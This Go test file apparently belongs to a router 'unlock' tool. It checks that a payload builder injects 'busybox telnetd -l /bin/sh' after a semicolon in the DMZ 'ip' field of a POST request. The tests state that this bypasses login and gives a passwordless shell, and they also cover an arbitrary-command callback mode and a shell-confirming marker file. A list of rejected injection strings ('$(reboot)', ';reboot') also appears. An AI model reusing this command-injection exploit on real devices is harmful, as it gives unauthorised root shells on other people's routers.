package zlt

import (
	"strings"
	"testing"
)

func TestDMZPayloadShape(t *testing.T) {
	p, err := DMZPayload("sess-1", "127.0.0.1", "busybox telnetd -l /bin/sh")
	if err != nil {
		t.Fatal(err)
	}
	if p["cmd"] != CmdNetworkService {
		t.Fatalf("cmd = %v", p["cmd"])
	}
	if p["subcmd"] != DefaultDMZSubCmd {
		t.Fatalf("subcmd = %v", p["subcmd"])
	}
	if p["method"] != "POST" {
		t.Fatalf("method = %v", p["method"])
	}
	if p["sessionId"] != "sess-1" {
		t.Fatalf("sessionId = %v", p["sessionId"])
	}
	if p["enabled"] != "1" {
		t.Fatalf("enabled = %v", p["enabled"])
	}
	want := "127.0.0.1;busybox telnetd -l /bin/sh"
	if p["ip"] != want {
		t.Fatalf("ip = %q, want %q", p["ip"], want)
	}
}

func TestDMZPayloadRejectsNonIPv4Host(t *testing.T) {
	bad := []string{
		"", "localhost", "127.0.0.1;reboot", "127.0.0.1 && reboot",
		"$(reboot)", "`reboot`", "1.2.3.4\nreboot", "999.1.1.1abc",
	}
	for _, h := range bad {
		if _, err := DMZPayload("s", h, "id"); err == nil {
			t.Fatalf("expected rejection for dmzHost %q", h)
		}
	}
}

func TestDMZPayloadRejectsEmptyOrMultilineCommand(t *testing.T) {
	if _, err := DMZPayload("s", "127.0.0.1", ""); err == nil {
		t.Fatal("empty command must be rejected")
	}
	if _, err := DMZPayload("s", "127.0.0.1", "id\nreboot"); err == nil {
		t.Fatal("multiline command must be rejected")
	}
}

func TestTelnetCommandPorts(t *testing.T) {
	if got := TelnetCommand(23); got != "busybox telnetd -l /bin/sh -p 23" {
		t.Fatalf("got %q", got)
	}
	if got := TelnetCommand(4444); !strings.Contains(got, "-p 4444") {
		t.Fatalf("got %q", got)
	}
	// Out-of-range falls back to 23 rather than emitting "-p 0".
	for _, bad := range []int{0, -1, 70000} {
		if got := TelnetCommand(bad); !strings.Contains(got, "-p 23") {
			t.Fatalf("port %d should fall back to 23, got %q", bad, got)
		}
	}
}

func TestTelnetCommandIsPasswordless(t *testing.T) {
	// The whole point: -l /bin/sh replaces the login program.
	if !strings.Contains(TelnetCommand(23), "-l /bin/sh") {
		t.Fatal("telnet payload must bypass the login handler")
	}
}

func TestVerifyCommandWritesMarker(t *testing.T) {
	got := VerifyCommand("abc123")
	if !strings.Contains(got, "echo abc123") || !strings.Contains(got, "/tmp/.zlt_unlock_marker") {
		t.Fatalf("unexpected verify command %q", got)
	}
}

func TestBuildPayloadModes(t *testing.T) {
	o := UnlockOptions{DMZHost: "127.0.0.1", Mode: ShellModeTelnet, Port: 23}
	p, err := o.BuildPayload("s")
	if err != nil {
		t.Fatal(err)
	}
	if ip, _ := p["ip"].(string); !strings.Contains(ip, "telnetd") {
		t.Fatalf("telnet mode should inject telnetd, got %q", ip)
	}

	o.Mode = ShellModeCallback
	o.Command = "touch /tmp/x"
	p, err = o.BuildPayload("s")
	if err != nil {
		t.Fatal(err)
	}
	if ip, _ := p["ip"].(string); ip != "127.0.0.1;touch /tmp/x" {
		t.Fatalf("callback mode wrong: %q", ip)
	}

	o.Mode = "nonsense"
	if _, err := o.BuildPayload("s"); err == nil {
		t.Fatal("unknown mode must error")
	}
}
